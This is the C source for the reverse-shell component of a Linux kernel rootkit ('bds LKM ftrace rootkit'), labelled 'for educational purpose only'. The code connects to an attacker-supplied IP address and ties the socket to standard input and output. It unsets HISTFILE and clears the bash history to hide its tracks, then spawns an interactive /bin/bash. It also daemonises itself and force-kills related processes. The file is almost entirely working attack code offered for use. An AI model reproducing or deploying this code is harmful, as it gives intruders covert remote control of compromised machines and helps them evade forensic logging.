/*
reverse shell for bds lkm ftrace rootkit

developed by : Antonius (Antonius Robotsoft)

website : www.bluedragonsec.com

github : https://github.com/bluedragonsecurity

twitter : https://twitter.com/bluedragonsec

Simple Stable LKM Rootkit for linux kernel 5.x and 6.x
to install rootkit, read readme.txt

Warning!! This rootkit is for educational purpouse only! I am not       
responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/file.h>
#include "bds_userspace_functions.h"
#include "bds_vars.h"

#ifndef MAX_IP_LENGTH
#	define MAX_IP_LENGTH 16
#endif
typedef int boolean;
static const boolean true = 1;
static const boolean false = 0;
static void __bc(char *ip);

void _print_usage(void)
{
	fprintf(stdout, "Usage : ./bds_reverse_shell <ip>");
	exit(-1);
}

static inline boolean validate_ipv4_octet(char *ipaddr)
{
	int j, octet_found = 0;
	boolean valid = false;
	
	if ((sizeof(ipaddr) > 0) && ipaddr[0] != '\0') {
		if ((strlen(ipaddr) > 0) && (strlen(ipaddr) <= MAX_IP_LENGTH)) {
			for (j = 0; j < (int)(strlen(ipaddr)); j++) {
				if (ipaddr[j] == (char)0x2e) 
					octet_found++;
			}
			if (octet_found == 3) 
				valid = true;
		}
	}
	else
		valid = false;
	
	return valid;
}

static void __bc(char *ip)
{
	struct sockaddr_in client_addr;
	int sock;

	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(reverse_shell_port);
	client_addr.sin_addr.s_addr = inet_addr(ip);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	//printf("[+] connecting to ip : %s on port %d\n", ip, reverse_shell_port);
	if (connect(sock, (const struct sockaddr *)&client_addr,sizeof(struct sockaddr_in)) < 0) {
		fprintf(stdout, "\nFailed to connect ! exit !\n");
		exit(-1);
	}
	else {
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
		system("unset HISTFILE");
		system("bash -c 'history -c'");
		system("uname -a");
		system("/bin/bash");
	}
}

int main(int argc, char *argv[])
{
	char *ip = NULL;
	boolean _valid_ip = false;
	
	system("killall -9 bds_rr");
	system("kill -9 31338");
	
	if (argc < 2) 
		_print_usage();
	ip = argv[1]; 
	_valid_ip = validate_ipv4_octet(ip);
	if (ip == NULL || _valid_ip == false)
		_print_usage();
	daemonize(reverse_pid);
	__bc(ip);

	return 0;
}
